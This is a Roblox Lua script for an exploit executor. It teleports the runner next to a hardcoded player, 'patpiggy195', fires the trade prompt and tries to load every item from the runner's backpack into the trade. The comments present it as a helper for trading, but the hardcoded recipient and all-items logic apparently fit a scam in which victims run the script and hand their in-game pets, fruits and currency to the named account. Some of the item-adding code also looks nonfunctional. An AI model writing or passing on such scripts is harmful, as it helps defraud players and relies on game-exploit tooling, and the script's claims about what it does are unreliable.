-- Settings
local targetUsername = "patpiggy195"  -- Person you want to trade with

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Wait for your character
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

-- Wait until target appears
local target = Players:FindFirstChild(targetUsername)
while not target do
    warn("Waiting for target", targetUsername)
    task.wait(1)
    target = Players:FindFirstChild(targetUsername)
end

-- Wait for target's character
local targetChar = target.Character or target.CharacterAdded:Wait()
local targetHRP = targetChar:WaitForChild("HumanoidRootPart")

-- Find your Trading Ticket and equip it
local function equipTradingTicket()
    local ticket = LocalPlayer.Backpack:FindFirstChild("Trading Ticket") or char:FindFirstChild("Trading Ticket")
    if ticket and ticket:IsA("Tool") then
        char:WaitForChild("Humanoid"):EquipTool(ticket)
        task.wait(0.5)  -- Wait for equip to take effect
        return true
    else
        warn("No Trading Ticket found!")
        return false
    end
end

-- Trigger trade prompt
local function openTradePrompt()
    local prompt = targetHRP:FindFirstChildOfClass("ProximityPrompt")
    if prompt then
        prompt.HoldDuration = 0.1
        fireproximityprompt(prompt)
        return true
    else
        warn("Trade prompt not found.")
        return false
    end
end

-- Add all items to trade UI
local function fillTrade()
    -- Add pets and fruits
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = LocalPlayer.Backpack  -- Activate tooltip in trade UI
            task.wait(0.1)
        end
    end
    -- Add Sheckles (if there's a UI element you can control)
    -- Example: game.ReplicatedStorage.OpenTradeUI:Fire(...)
    -- (Implementation depends on how the game scripts handles currency addition)
end

-- Main Process
if equipTradingTicket() then
    -- Move close to target
    char:SetPrimaryPartCFrame(targetHRP.CFrame * CFrame.new(0, 0, -2))
    task.wait(0.5)
    if openTradePrompt() then
        task.wait(1)  -- Wait for Trading Hub to appear
        fillTrade()
        print("âœ… Trade items placed into trading UI.")
    end
end
